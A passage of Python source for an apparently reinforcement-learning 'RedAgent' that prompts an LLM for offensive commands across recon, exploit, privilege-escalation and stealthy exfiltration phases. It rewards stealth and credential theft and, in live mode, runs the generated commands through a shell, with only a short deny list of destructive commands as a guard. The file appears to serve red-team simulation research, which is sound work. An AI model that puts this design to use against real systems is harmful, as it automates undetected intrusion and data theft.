                elif step == 1 or step % 5 == 0:
                    console.print(
                        f"[{self.agent_id}] Step {step} | Action: {command} | Phase: {phase} | Reward: {shaped_reward:.2f}"
                    )
            elif self.verbosity == "quiet":
                if (
                    fallback_triggered
                    or shaped_reward < 0
                    or step == 1
                    or step % 10 == 0
                ):
                    console.print(
                        f"[{self.agent_id}] 🚨 Step {step} | Reward: {shaped_reward:.2f}"
                    )
            # Summarize every 5 steps
            if step % 5 == 0 and self.verbosity != "quiet":
                stats = self.stats_monitor._get_agent_stats(self.agent_id)
                recent_rewards = stats.rewards[-5:] if len(stats.rewards) >= 5 else stats.rewards
                avg_reward = sum(recent_rewards) / len(recent_rewards) if recent_rewards else 0.0
                alert = state.get("blue_team_alert", 0)
                console.print(
                    f"[Summary] {self.agent_id} Steps {step-4}-{step}: Avg Reward {avg_reward:+.1f} | Alert {alert:.1f}"
                )
            console.print(
                f"[dim]Replay buffer: {len(self.prioritized_experiences)} | Epsilon: {self.epsilon:.3f} | Entropy: {self.entropy_beta:.3f}[/dim]"
            )
            # Track token usage for visualization
            if hasattr(self.stats_monitor, "log_gpt_call"):
                self.stats_monitor.log_gpt_call(self.agent_id)
            # After decision, broadcast own phase/intent
            if self.agent_manager and hasattr(self.agent_manager, "broadcast"):
                self.agent_manager.broadcast(
                    f"{self.agent_id}_phase", state["phase"], sender=self.agent_id
                )
            # Log transition to ReplayBuffer (deduplication, prioritized replay, GPT tokens)
            gpt_tokens = (
                self.gpt_manager.get_token_usage()
                if hasattr(self.gpt_manager, "get_token_usage")
                else 0
            )
            experience = {
                "state": state_tensor.cpu().tolist(),
                "action": command,
                "reward": shaped_reward,
                "next_state": self.encode_env_state(next_state).cpu().tolist(),
                "gpt_tokens": gpt_tokens,
            }
            self.replay_buffer.add(experience)
            self.last_reward = shaped_reward

            # --- Add: Print stats after each step ---
            if hasattr(self.stats_monitor, "show"):
                if step % 10 == 0 or step == 1:
                    self.stats_monitor.show()
            # --- RedAgentBrain episodic memory logging ---
            self.redagent_brain.log_step(
                state=state,
                command=command,
                gpt_response=gpt_reason,
                output=output,
                reward=shaped_reward,
                success=parsed.get("success", False),
                model="4.1" if fallback_triggered else "4o-mini",
                tokens=gpt_tokens,
                step=step,
                episode=episode,
            )
            # --- MemoryRouter evolution log ---
            if hasattr(self.memory_router, "log_redagent_evolution"):
                evolution_data = {
                    "intent": state.get("phase", "N/A"),
                    "command": command,
                    "output": output,
                    "gpt_comment": gpt_reason,
                    "success": parsed.get("success", False),
                    "episode": episode,
                    "step": step,
                    "reward": shaped_reward,
                    "timestamp": self.total_steps
                }
                self.memory_router.log_redagent_evolution(
                    agent_id=self.agent_id,
                    evolution_data=evolution_data,
                    episode=episode
                )
            # After each agent action, log action description, reward, risk
            action_desc = (
                command if isinstance(command, str) else get_action_description(command)
            )
            risk_val = state.get("detection_risk", 0)
            console.print(
                f"[{self.agent_id}] Action executed: {action_desc} | Reward: {shaped_reward:.2f} | Risk: {risk_val:.2f}"
            )
            self.step_count += 1
            # --- Target network update every target_update_freq steps ---
            if self.step_count % self.target_update_freq == 0:
                self.target_net.load_state_dict(self.policy_net.state_dict())
            # Log epsilon for monitoring
            if (step == 1 or step % 10 == 0) and self.verbosity in ("debug", "verbose"):
                console.print(f"[cyan]Epsilon: {self.epsilon:.4f}[/cyan]")
            return {
                "command": command,
                "phase": state.get("phase", "N/A"),
                "reward": float(shaped_reward),
                "gpt_calls": (
                    self.stats_monitor._get_agent_stats(self.agent_id).gpt_calls
                    if self.agent_id in self.stats_monitor.agent_stats
                    else 0
                ),
                "output": output,
                "reasoning": self.last_reasoning,
                "step": step,
                "episode": episode,
                "agent_id": self.agent_id,
                "replay_buffer": len(self.prioritized_experiences),
                "epsilon": float(self.epsilon),
                "entropy_beta": float(self.entropy_beta),
            }
        except Exception as e:
            console.print(f"[red]❌ Error in RedAgent simulate_step: {e}[/red]")
            import traceback

            console.print(traceback.format_exc())
            return {
                "command": "N/A",
                "phase": "N/A",
                "reward": 0.0,
                "gpt_calls": 0,
                "output": f"Error: {e}",
                "reasoning": "Error occurred",
                "step": step,
                "episode": episode,
                "agent_id": self.agent_id,
                "replay_buffer": 0,
                "epsilon": float(self.epsilon),
                "entropy_beta": float(self.entropy_beta),
            }

    def _log_training_step(self, episode, step, command, state, output):
        with open(self.training_log_path, "a") as f:
            f.write(
                f"Episode {episode}, Step {step}, Command: {command}, Phase: {state.get('phase')}, Output: {output}\n"
            )

    def calculate_reward(
        self, env_reward, parsed, command, cmd_data=None, detect_redundancy=None
    ):
        """
        Enhanced reward shaping with improved redundancy detection and richer behavioral incentives.
        Combines environment reward with:
        - Stealth score (positive)
        - Risk reduction (positive)
        - Honeypot penalty (negative)
        - Redundancy penalty (multiplicative)
        - Progress bonus (additive)
        """
        try:
            # Ensure env_reward is a float
            if isinstance(env_reward, dict):
                env_reward = env_reward.get("reward", 0.0)
            env_reward = float(env_reward) if env_reward is not None else 0.0
            
            # Extract parsed values with defensive handling
            stealth_score = float(parsed.get("stealth_score", 0.0)) if parsed else 0.0
            risk_score = float(parsed.get("risk_score", 0.0)) if parsed else 0.0
            honeypot_penalty = -20.0 if parsed and parsed.get("honeypot_triggered") else 0.0
            
            # Base reward shaping
            stealth_bonus = stealth_score * 2.5  # Higher weight for stealth
            risk_penalty = risk_score * 0.6      # Lower weight for risk
            
            # Progress bonuses
            progress_bonus = 0.0
            if parsed:
                if parsed.get("new_information", False):
                    progress_bonus += 2.0  # Bonus for discovering new information
                if parsed.get("credentials_found", False):
                    progress_bonus += 5.0  # Major bonus for finding credentials
                if parsed.get("privilege_escalation", False):
                    progress_bonus += 8.0  # Substantial bonus for privilege escalation
            
            # Combined shaped reward
            base_shaping = stealth_bonus - risk_penalty + honeypot_penalty + progress_bonus
            reward = env_reward + base_shaping
            
            # Apply redundancy penalties
            redundancy_applied = False
            
            # Check for command repetition (internal check)
            if self.last_action == command and self.last_action is not None:
                reward *= (0.95 - (0.15 * min(self.repeated_action_count, 3)))
                redundancy_applied = True
            
            # Use RedAgentBrain for smarter redundancy detection
            if hasattr(self, "redagent_brain") and self.redagent_brain:
                is_redundant, reason, _ = self.redagent_brain.check_redundancy(command, None)
                if is_redundant:
                    # If not already penalized, apply bigger penalty for semantic redundancy
                    if not redundancy_applied:
                        reward *= self.redundancy_penalty
                    # Even if already penalized, apply additional small penalty
                    else:
                        reward *= 0.95
                    redundancy_applied = True
            
            # Ensure reward doesn't become too negative
            reward = max(reward, -50.0)
            
            # Log reward calculation for debugging if needed
            if hasattr(self, "stats_monitor") and self.stats_monitor:
                self.stats_monitor.log_step(
                    self.agent_id, 
                    command, 
                    reward=reward, 
                    redundancy=1 if redundancy_applied else 0
                )
                
            return reward
            
        except Exception as e:
            # Safety fallback - never crash on reward calculation
            if hasattr(self, "verbosity") and self.verbosity not in ["quiet", "silent"]:
                print(f"⚠ Warning: Error in calculate_reward: {e}. Using base env reward.")
            # Safe float conversion
            try:
                if env_reward is None:
                    return 0.0
                elif isinstance(env_reward, (int, float)):
                    return float(env_reward)
                elif isinstance(env_reward, dict) and 'reward' in env_reward:
                    return float(env_reward['reward'])
                else:
                    return 0.0
            except (ValueError, TypeError):
                return 0.0

    def update_memory_and_teach(
        self, command, reward, context, parsed, state_tensor, next_state, done
    ):
        # Ensure full_command is always present
        full_command = command
        if "full_command" not in parsed or not parsed.get("full_command"):
            parsed["full_command"] = full_command
        # Log transition to MemoryRouter (deduplication, prioritized replay, GPT tokens)
        gpt_tokens = (
            self.gpt_manager.get_token_usage()
            if hasattr(self.gpt_manager, "get_token_usage")
            else 0
        )
        self.memory_router.log_transition(
            self.agent_id,
            state_tensor.cpu().tolist(),
            command,
            reward,
            next_state,  # Pass the original dict instead of encoded version
            priority=abs(reward) + 0.01,
            gpt_tokens=gpt_tokens,
        )
        self.teacher.add_action(
            command=command,
            description=parsed.get("description", "Auto-parsed action."),
            phase=parsed.get("phase", context.get("phase")),
            reward=int(reward),
            when=f"Ep{self.total_episodes + 1}-Step{self.total_steps}",
            why=self.last_reasoning,
            full_command=parsed.get("full_command", command),
        )

    def train_on_batch(self):
        # Double DQN: Use policy_net to select next action, target_net to evaluate
        try:
            # Try with prioritized sampling first
            batch_data = self.replay_buffer.sample(self.batch_size, prioritized=True)
            if isinstance(batch_data, tuple) and len(batch_data) == 3:
                batch, indices, weights = batch_data
            else:
                # Fallback to regular sampling
                batch = self.replay_buffer.sample(self.batch_size)
                indices = list(range(len(batch))) if batch else []
                weights = torch.ones(len(batch)) if batch else torch.tensor([])
        except Exception:
            # Final fallback to simple sampling
            batch = self.replay_buffer.sample(self.batch_size)
            indices = list(range(len(batch))) if batch else []
            weights = torch.ones(len(batch)) if batch else torch.tensor([])
        
        if not batch:
            console.print(
                "[yellow]⚠ Not enough experiences for batch training.[/yellow]"
            )
            return
        states = torch.stack([
            torch.tensor(exp["state"], dtype=torch.float32, device=self.device)
            for exp in batch
        ])
        actions = torch.tensor(
            [exp["action"] if isinstance(exp["action"], int) else 0 for exp in batch],
            dtype=torch.long,
            device=self.device,
        )
        rewards = torch.tensor(
            [exp["reward"] for exp in batch], dtype=torch.float32, device=self.device
        )
        next_states = torch.stack([
            torch.tensor(exp["next_state"], dtype=torch.float32, device=self.device)
            for exp in batch
        ])
        dones = torch.zeros(len(batch), dtype=torch.float32, device=self.device)  # Placeholder
        weights = torch.tensor(weights, dtype=torch.float32, device=self.device) if weights is not None else torch.ones(len(batch), device=self.device)

        # Double DQN logic
        with torch.no_grad():
            next_actions = self.policy_net(next_states).argmax(dim=1)
            next_q_values = self.target_net(next_states)
            max_next_q = next_q_values.gather(1, next_actions.unsqueeze(1)).squeeze()
            targets = rewards + self.gamma * max_next_q * (1 - dones)
        q_values = self.policy_net(states)
        q_selected = q_values.gather(1, actions.unsqueeze(1)).squeeze()
        # Use importance-sampling weights for prioritized replay
        loss = (weights * torch.nn.functional.smooth_l1_loss(q_selected, targets, reduction='none')).mean()
        
        # Use the properly initialized optimizers
        self.policy_optimizer.zero_grad()
        loss.backward()
        torch.nn.utils.clip_grad_norm_(self.policy_net.parameters(), 1.0)
        self.policy_optimizer.step()
        self.policy_scheduler.step()
        self.target_net.eval()
        
        # Update priorities in replay buffer if method exists
        td_errors = (q_selected - targets).detach().cpu().numpy()
        if hasattr(self.replay_buffer, 'update_priorities'):
            self.replay_buffer.update_priorities(indices, td_errors)
        # Epsilon decay
        old_epsilon = self.epsilon
        self.epsilon = max(self.epsilon * self.epsilon_decay, self.epsilon_min)
        if self.verbosity in ("debug", "verbose"):
            console.print(f"[cyan]🔧 {self.agent_id}: Double DQN batch training complete. Loss: {loss.item():.4f} | Epsilon: {old_epsilon:.4f}→{self.epsilon:.4f}[/cyan]")
        # Log training completion
        if self.verbosity in ("debug", "verbose"):
            console.print(f"[green]✅ Double DQN batch training complete. Loss: {loss.item():.4f}[/green]")
        
        # Sync experiences to MemoryRouter
        if hasattr(self.memory_router, 'log_training_batch'):
            batch_info = {
                "batch_size": len(batch),
                "loss": loss.item(),
                "epsilon": self.epsilon,
                "agent_id": self.agent_id
            }
            self.memory_router.log_training_batch(
                agent_id=self.agent_id,
                batch_info=batch_info
            )
        else:
            # Log to file instead
            logging.info(f"Training batch: agent={self.agent_id}, batch_size={len(batch)}, loss={loss.item():.4f}, epsilon={self.epsilon:.4f}")
        # Moving average loss
        if not hasattr(self, "loss_history"):
            self.loss_history = []
        self.loss_history.append(loss.item())
        if len(self.loss_history) > 100:
            self.loss_history.pop(0)
        avg_loss = sum(self.loss_history) / len(self.loss_history)
        if self.verbosity in ("debug", "verbose"):
            console.print(f"[magenta]Moving Avg Loss (last 100): {avg_loss:.4f}")
        # Redundancy pruning after each batch
        from core.logic.redundancy_detector import detect_redundancy_batch
        self.replay_buffer.prune_redundancy(lambda cmds: detect_redundancy_batch(cmds))

    def simulate_train(self, episodes=1, max_steps=50):
        """
        Run training simulation for specified number of episodes.
        This method is called by MultiAgentTrainer to train the agent.
        
        Args:
            episodes: Number of episodes to run
            max_steps: Maximum steps per episode
            
        Returns:
            dict: Training results including rewards, steps, etc.
        """
        total_reward = 0.0
        total_steps = 0
        episode_rewards = []
        
        for episode in range(episodes):
            episode_reward = 0.0
            episode_steps = 0
            
            # Reset environment for new episode
            if hasattr(self.env, "reset"):
                self.env.reset()
            
            # Run episode steps
            for step in range(1, max_steps + 1):
                try:
                    # Get action from simulate_step
                    step_result = self.simulate_step(episode + 1, step)
                    
                    if step_result and isinstance(step_result, dict):
                        step_reward = step_result.get("reward", 0.0)
                        episode_reward += step_reward
                        total_reward += step_reward
                    
                    episode_steps += 1
                    total_steps += 1
                    
                    # Check if episode should end early
                    if step_result and step_result.get("done", False):
                        break
                        
                except Exception as e:
                    console.print(f"[yellow]⚠ Training step error: {e}[/yellow]")
                    break
            
            episode_rewards.append(episode_reward)
            
            # Perform batch training if we have enough experiences
            if len(self.replay_buffer.buffer) >= self.batch_size:
                try:
                    self.train_on_batch()
                except Exception as e:
                    console.print(f"[yellow]⚠ Batch training error: {e}[/yellow]")
        
        # Update episode counter
        self.total_episodes += episodes
        
        # Return training results in expected format
        return {
            "agent_id": self.agent_id,
            "episodes": episodes,
            "total_reward": total_reward,
            "average_reward": total_reward / episodes if episodes > 0 else 0.0,
            "total_steps": total_steps,
            "episode_rewards": episode_rewards,
            "final_epsilon": float(self.epsilon),
            "replay_buffer_size": len(self.replay_buffer.buffer) if hasattr(self.replay_buffer, 'buffer') else 0,
            "detection_risk": getattr(self, '_last_state', {}).get("detection_risk", 0.0),
            "gpt_calls": self.stats_monitor._get_agent_stats(self.agent_id).gpt_calls if self.agent_id in self.stats_monitor.agent_stats else 0,
            "gpt_tokens": getattr(self, 'gpt_tokens_used', 0)
        }

    def add_to_prioritized_memory(self, experience, priority):
        if len(self.prioritized_experiences) >= self.replay_memory_size:
            removed = self.prioritized_experiences.pop(0)
            self.prioritized_priorities.pop(0)
            console.print(f"[dim]♻ Removed oldest experience: {removed}[/dim]")
        self.prioritized_experiences.append(experience)
        self.prioritized_priorities.append(priority)

    def display_advanced_status(self):
        table = Table(title=f"🦂 {self.agent_id} Strategic Overview", show_lines=True)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="magenta")
        avg_reward = self.stats_monitor.get_average_reward()
        detection_rate = self.stats_monitor.get_detection_rate()
        table.add_row("Role", self.role)
        table.add_row("Episodes Completed", str(self.total_episodes))
        table.add_row("Total Steps", str(self.total_steps))
        table.add_row("Avg Reward", f"{avg_reward:.2f}")
        table.add_row("Detection Rate", f"{detection_rate:.2%}")
        table.add_row("Epsilon (Exploration)", f"{self.epsilon:.4f}")
        table.add_row("Entropy Beta", f"{self.entropy_beta:.4f}")
        table.add_row(
            "Replay Buffer",
            f"{len(self.prioritized_experiences)} / {self.replay_memory_size}",
        )
        table.add_row(
            "Last Reasoning",
            self.last_reasoning[:60] + "..." if self.last_reasoning else "N/A",
        )
        console.print(
            Panel(table, title="🧠 Strategic Overview", border_style="bright_blue")
        )
        console.print(f"[dim]Training log: {self.training_log_path}[/dim]")
        if hasattr(self.stats_monitor, "visualize_phase_distribution"):
            self.stats_monitor.visualize_phase_distribution()
        else:
            console.print("[yellow]⚠️ StatsMonitor missing visualize_phase_distribution method[/yellow]")
        episode_summary_table = Table(
            title=f"Episode Summary - {self.agent_id}", show_lines=True
        )
        episode_summary_table.add_column("Metric", style="cyan")
        episode_summary_table.add_column("Value", style="magenta")
        # Calculate total_reward from stats_monitor if available, else fallback to 0.0
        total_reward = 0.0
        if self.agent_id in self.stats_monitor.agent_stats:
            stats = self.stats_monitor._get_agent_stats(self.agent_id)
            total_reward = sum(stats.rewards) if stats.rewards else 0.0
        episode_summary_table.add_row("Episode Reward", f"{total_reward:.2f}")
        episode_summary_table.add_row("Total Steps", str(self.total_steps))
        episode_summary_table.add_row("Mode Used", self.current_mode)
        # Use a safe fallback for state if not available
        blue_team_alert = 0.0
        try:
            blue_team_alert = self._last_state.get("blue_team_alert", 0.0)
        except Exception:
            pass
        episode_summary_table.add_row("Blue Team Alert", f"{blue_team_alert:.2f}")
        episode_summary_table.add_row(
            "Detection Rate", f"{self.stats_monitor.get_detection_rate():.2%}"
        )
        # Removed incomplete add_row call that caused syntax error.

    def get_base_commands(self):
        # For CLI completion/autosuggest
        return [
            "nmap",
            "hydra",
            "msfconsole",
            "sqlmap",
            "ffuf",
            "gobuster",
            "linpeas",
            "winpeas",
            "evil-winrm",
            "masscan",
            "amass",
            "crackmapexec",
            "enum4linux",
            "pspy",
        ]

    def get_visualization_panel(self):
        """Return a rich Panel with detailed agent info for visualization."""
        from rich.panel import Panel
        from rich.table import Table

        table = Table(title=f"{self.agent_id} — Advanced Status", show_lines=True)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="magenta")
        table.add_row("Role", self.role)
        table.add_row("Episodes", str(self.total_episodes))
        table.add_row("Steps", str(self.total_steps))
        table.add_row("Avg Reward", f"{self.stats_monitor.get_average_reward():.2f}")
        table.add_row("Epsilon", f"{self.epsilon:.4f}")
        table.add_row("Entropy Beta", f"{self.entropy_beta:.4f}")
        table.add_row(
            "Last Reasoning",
            self.last_reasoning[:80] + "..." if self.last_reasoning else "N/A",
        )
        return Panel(
            table, title=f"🦂 {self.agent_id} Strategic Panel", border_style="red"
        )

    def sync_memory(self) -> bool:
        # Implementation for MemorySyncInterface
        try:
            if self.memory_router and hasattr(self.memory_router, 'sync_global_insights'):
                self.memory_router.sync_global_insights()
            
            from core.logic.redundancy_detector import detect_redundancy_batch
            if hasattr(self.replay_buffer, 'prune_redundancy'):
                self.replay_buffer.prune_redundancy(lambda cmds: detect_redundancy_batch(cmds))
            
            return True
        except Exception as e:
            console.print(f"[red]❌ Error syncing memory: {e}[/red]")
            return False

    def reset(self):
        """Reset stats and replay buffer for new episode."""
        self.total_steps = 0
        self.command_history.clear()
        
        # Initialize prioritized collections if they don't exist
        if not hasattr(self, 'prioritized_experiences'):
            self.prioritized_experiences = []
        if not hasattr(self, 'prioritized_priorities'):
            self.prioritized_priorities = []
            
        # Clear prioritized experiences and priorities
        self.prioritized_experiences.clear()
        self.prioritized_priorities.clear()
        
        if hasattr(self, "stats_monitor"):
            self.stats_monitor.reset()
        # Retrieve recent steps from episodic memory (last 10 steps)
        recent_steps = (
            self.redagent_brain.get_recent_steps(10)
            if hasattr(self.redagent_brain, "get_recent_steps")
            else []
        )
        summary = "\n"
        prompt = f"""
You are a cybersecurity RL agent coach. Analyze the following RedAgent steps and suggest improvements:
{summary}
- Identify repeated failures and suggest alternative commands.
- Highlight successful tactics to reinforce.
- Suggest one new strategy for the next episode.
Respond in JSON: {{"improvements": [...], "reinforce": [...], "new_strategy": "..."}}
"""
        gpt_feedback = self.gpt_manager.gpt_request(prompt, task_type="reflection", model="local-llm")
        
        # Phase 38 B4: Parse reflection JSON and store for next episode's context
        if gpt_feedback and isinstance(gpt_feedback, str):
            try:
                import json as _json
                # Try to extract JSON from the response
                _fb = gpt_feedback.strip()
                _start = _fb.find('{')
                _end = _fb.rfind('}')
                if _start >= 0 and _end > _start:
                    _parsed = _json.loads(_fb[_start:_end + 1])
                    self._last_reflection = {
                        "new_strategy": _parsed.get("new_strategy", ""),
                        "improvements": _parsed.get("improvements", [])[:3],
                        "reinforce": _parsed.get("reinforce", [])[:3],
                    }
                    logger.info(f"[RED-B4] Reflection stored: strategy='{self._last_reflection['new_strategy'][:80]}'")
            except (ValueError, KeyError, TypeError):
                logger.debug("[RED-B4] Failed to parse reflection JSON, skipping")
        
        # Log GPT feedback using redagent_brain
        if gpt_feedback and hasattr(self, "redagent_brain") and self.redagent_brain:
            summary = f"Episode {self.total_episodes} reset reflection"
            self.redagent_brain.log_gpt_feedback(
                prompt=prompt,
                gpt_feedback=gpt_feedback,
                summary=summary,
                episode=self.total_episodes
            )
            console.print(f"[green]🧠 GPT Feedback logged to RedAgentBrain[/green]")
        elif gpt_feedback:
            # Fallback if redagent_brain isn't available
            console.print(f"[yellow]🧠 GPT Feedback (not logged): {gpt_feedback}[/yellow]")

    def _build_gpt_prompt(self, state, phase):
        """
        Build a context-aware, concise prompt for GPT to generate optimal commands.
        Uses phase information, current state, and historical context.
        """
        base_prompt = (
            f"As an offensive security specialist, generate a single Linux command for the '{phase}' phase. "
            f"Current environment details:"
        )

        # Add state details
        state_summary = []
        if "privilege_level" in state:
            state_summary.append(f"Privilege: {state['privilege_level']}")
        if "open_ports" in state:
            ports = ", ".join(map(str, state["open_ports"][:5]))  # Limit to first 5 ports
            state_summary.append(f"Open ports: {ports}")
        if "services" in state:
            services = ", ".join(state["services"][:5]) if isinstance(state["services"], list) else "unknown"
            state_summary.append(f"Services: {services}")
        if "detection_risk" in state:
            state_summary.append(f"Detection risk: {state['detection_risk']:.1f}")
        if "blue_team_alert" in state:
            state_summary.append(f"Blue team alert: {state['blue_team_alert']:.1f}")
        
        # Add phase-specific guidance
        phase_guidance = {
            "recon": "Focus on network discovery and service identification without triggering alerts.",
            "enumeration": "Enumerate services, gather information about potential vulnerabilities.",
            "exploit": "Exploit identified vulnerabilities to gain initial access.",
            "privesc": "Escalate privileges from current user to higher permissions.",
            "exfiltrate": "Extract valuable data with minimal detection."
        }

        # Include command history context (reduced to save tokens)
        history_context = ""
        if self.command_history:
            recent_commands = self.command_history[-3:] if len(self.command_history) > 3 else self.command_history
            history_context = f"Recently executed commands: {', '.join(recent_commands)}. Generate a NON-REDUNDANT command."
        
        # Add any rewards information
        reward_context = ""
        if hasattr(self, "last_reward") and self.last_reward is not None:
            reward_sign = "positive" if self.last_reward > 0 else "negative" 
            reward_context = f"Last command resulted in {reward_sign} reward. "
            
            if self.last_reward < 0:
                reward_context += "Try a different approach. "
        
        # Build final concise prompt
        # Phase 38 B4: Inject last episode's reflection strategy
        _reflection_ctx = ""
        if hasattr(self, '_last_reflection') and self._last_reflection:
            _strat = self._last_reflection.get("new_strategy", "")
            if _strat:
                _reflection_ctx = f"Previous episode insight: {_strat[:120]}. "
        
        prompt = (
            f"{base_prompt}\n"
            f"- {', '.join(state_summary)}\n"
            f"- {phase_guidance.get(phase, 'Proceed with caution.')}\n"
            f"{reward_context}\n{history_context}\n"
            f"{_reflection_ctx}"
            f"Respond with ONLY a single command appropriate for {phase} phase. No explanations."
        )
        
        return prompt

    def extract_output(self, command):
        """
        Extract the output of a command, either by running it in a subprocess
        or by parsing from CyberEnvironment's response.
        
        This executes commands in simulation or live mode depending on settings.
        """
        try:
            # Try to run the command through the environment first
            if hasattr(self.env, "get_command_output"):
                output = self.env.get_command_output(command)
                if output:
                    # Log that we're executing a real command via environment
                    if self.verbosity not in ["quiet", "silent"]:
                        console.print(f"[green]🚀 Executing via environment: {command}[/green]")
                    return output
            
            # Check if we're allowed to run real commands (live mode)
            is_live_mode = False
            if hasattr(self.env, "live_mode"):
                is_live_mode = self.env.live_mode
            
            # In live mode, try to run the actual command in a subprocess with safety checks
            if is_live_mode:
                # SAFETY: Check for dangerous commands before executing
                dangerous_commands = ["rm -rf", ":(){ :|:& };:", "> /dev/sda", "dd if=/dev/zero"]
                if any(dangerous in command for dangerous in dangerous_commands):
                    console.print(f"[red]⚠️ Blocked dangerous command: {command}[/red]")
                    return f"Command blocked for safety: {command}"
                
                # Execute in subprocess with timeout
                import subprocess
                import threading
                
                try:
                    # Set a timeout of 10 seconds for command execution
                    result = subprocess.run(
                        command, 
                        shell=True, 
                        capture_output=True, 
                        text=True, 
                        timeout=10
                    )
                    
                    # Get the output
                    if result.returncode == 0:
                        console.print(f"[green]✅ Command executed successfully: {command}[/green]")
                        return result.stdout
                    else:
                        console.print(f"[yellow]⚠️ Command returned error ({result.returncode}): {command}[/yellow]")
                        return f"Error: {result.stderr}"
                except subprocess.TimeoutExpired:
                    console.print(f"[yellow]⏱️ Command timed out: {command}[/yellow]")
                    return "Command execution timed out"
                except Exception as e:
                    console.print(f"[red]❌ Error executing command: {e}[/red]")
                    return f"Error executing command: {str(e)}"
            
            # If we get here, run in simulation mode
            console.print(f"[blue]🔮 Simulating command: {command}[/blue]")
            
            # Simulation logic for different command types
            if command.startswith("echo"):
                return command[5:]  # Echo command output
            
            if command.startswith("nmap"):
                target = command.split()[-1] if len(command.split()) > 1 else "10.10.10.10"
                return f"Starting Nmap scan...\nScanning {target}...\nOpen ports: 22, 80, 445\nService detection completed."
                
            if "gobuster" in command:
                target = "http://10.10.10.10"
                for part in command.split():
                    if part.startswith("http"):
                        target = part
                return f"Starting gobuster scan on {target}...\n/admin (Status: 200)\n/login (Status: 200)\n/css (Status: 301)"
                
            if "hydra" in command:
                target = command.split()[-1] if len(command.split()) > 1 else "ssh://10.10.10.10"
                return f"Hydra starting...\n[22][ssh] host: {target}   login: admin   password: password123"
                
            if "find" in command and "perm" in command:
                return "/usr/bin/sudo\n/bin/ping\n/usr/bin/passwd"
                
            if any(term in command for term in ["nc", "zip", "tar", "base64"]):
                return f"Data transfer complete: {command}"
                
            # Generic fallback for any other command
            return f"Command executed (simulation): {command}"
            
        except Exception as e:
            # Always return a string, never fail completely
            console.print(f"[yellow]⚠ Error in extract_output: {e}[/yellow]")
            return f"Error executing command: {str(e)}"

    def process_directive(self, directive_type: str, parameters: Dict[str, Any], 
                         priority: int = 1, source_agent: str = "OrionAgent") -> Dict[str, Any]:
        """
        Process a strategic directive from another agent (typically OrionAgent).
        
        Implements the AgentInterface's process_directive method to handle directives from OrionAgent.
        
        Args:
            directive_type: Type of directive (e.g., STEALTH, AGGRESSIVE, FOCUSED_TARGET)
            parameters: Additional parameters for the directive
            priority: Priority level (1-5, with 5 being highest)
            source_agent: Agent that issued the directive
            
        Returns:
            Dict with processing results
        """
        processing_result = {
            "processed": True,
            "directive_type": directive_type,
            "source_agent": source_agent,
            "priority": priority,
            "action_taken": None
        }
        
        try:
            # Log directive receipt
            console.print(f"[cyan]📥 {self.agent_id} received directive '{directive_type}' (priority: {priority}) from {source_agent}[/cyan]")
            
            # Process based on directive type
            directive_type_lower = directive_type.lower()
            
            # Handle stealth directives
            if "stealth" in directive_type_lower or "avoid_detection" in directive_type_lower:
                # Apply stealth mode
                self.current_mode = "stealth"
                
                # Adjust exploration and entropy parameters for stealth operations
                if hasattr(self, "epsilon") and self.epsilon > 0.1:
                    self.epsilon = max(0.1, self.epsilon * 0.8)  # Reduce exploration
                
                if hasattr(self, "entropy_beta") and self.entropy_beta > 0.005:
                    self.entropy_beta = max(0.005, self.entropy_beta * 0.7)  # Reduce entropy
                
                processing_result["action_taken"] = "Applied stealth mode and reduced exploration parameters"
                console.print(f"[blue]🕵️ RedAgent switched to stealth mode (epsilon: {self.epsilon:.3f}, entropy: {self.entropy_beta:.3f})[/blue]")
            
            # Handle aggressive directives
            elif "aggressive" in directive_type_lower:
                # Apply aggressive mode
                self.current_mode = "aggressive"
                
                # Adjust exploration and entropy parameters for more aggressive operations
                if hasattr(self, "epsilon") and self.epsilon < 0.5:
                    self.epsilon = min(0.5, self.epsilon * 1.5)  # Increase exploration
                
                if hasattr(self, "entropy_beta") and self.entropy_beta < 0.02:
                    self.entropy_beta = min(0.02, self.entropy_beta * 1.5)  # Increase entropy
                
                processing_result["action_taken"] = "Applied aggressive mode and increased exploration parameters"
                console.print(f"[red]⚡ RedAgent switched to aggressive mode (epsilon: {self.epsilon:.3f}, entropy: {self.entropy_beta:.3f})[/red]")
            
            # Handle focused target directives
            elif "focused_target" in directive_type_lower:
                target_service = parameters.get("service_focus")
                if target_service:
                    # Set focus on specific service
                    self.current_focus = target_service
                    processing_result["action_taken"] = f"Set focus on service: {target_service}"
                    console.print(f"[yellow]🎯 RedAgent focusing on {target_service}[/yellow]")
                
                target_action = parameters.get("action")
                if target_action:
                    # Add specific action to priority queue if we track that
                    if hasattr(self, "priority_queue"):
                        if not isinstance(self.priority_queue, list):
                            self.priority_queue = []
                        
                        # Add action to priority queue with directive's priority
                        self.priority_queue.append((target_action, priority))
                        processing_result["action_taken"] = f"Added {target_action} to priority queue"
            
            # Handle phase change directives
            elif "change_phase" in directive_type_lower:
                new_phase = parameters.get("new_phase")
                if new_phase and hasattr(self, "env") and hasattr(self.env, "current_phase"):
                    # Change phase in environment
                    old_phase = self.env.current_phase
                    self.env.current_phase = new_phase
                    
                    processing_result["action_taken"] = f"Changed phase from {old_phase} to {new_phase}"
                    console.print(f"[magenta]🔄 RedAgent changed phase: {old_phase} → {new_phase}[/magenta]")
            
            # Handle coordination directives
            elif "coordination" in directive_type_lower:
                # Extract action chain if provided
                action_chain = parameters.get("action_chain")
                if action_chain and isinstance(action_chain, list) and action_chain:
                    # Store action chain for execution
                    if not hasattr(self, "action_chains"):
                        self.action_chains = []
                    
                    # Store the chain with its priority for later execution
                    self.action_chains.append({"chain": action_chain, "priority": priority, "index": 0})
                    
                    processing_result["action_taken"] = f"Stored action chain with {len(action_chain)} steps"
                    console.print(f"[green]📋 RedAgent received action chain with {len(action_chain)} steps[/green]")
            
            # Handle resource allocation directives
            elif "resource_allocation" in directive_type_lower:
                # Handle forced exploration parameter
                if parameters.get("forced_exploration", False):
                    old_epsilon = self.epsilon
                    self.epsilon = 0.9  # Force high exploration
                    
                    # Reset repetition tracking
                    if hasattr(self, "repeated_action_count"):
                        self.repeated_action_count = 0
                    if hasattr(self, "repeat_steps"):
                        self.repeat_steps = 0
                    
                    processing_result["action_taken"] = f"Increased exploration from {old_epsilon:.2f} to {self.epsilon:.2f}"
                
                # Handle novel command suggestion
                novel_command = parameters.get("novel_command")
                if novel_command and hasattr(self, "command_history"):
                    # Add command to history to execute on next step
                    self.command_history.append(novel_command)
                    
                    # Use brain to evaluate this command if available
                    if hasattr(self, "redagent_brain") and self.redagent_brain:
                        self.redagent_brain.log_novel_command(
                            command=novel_command, 
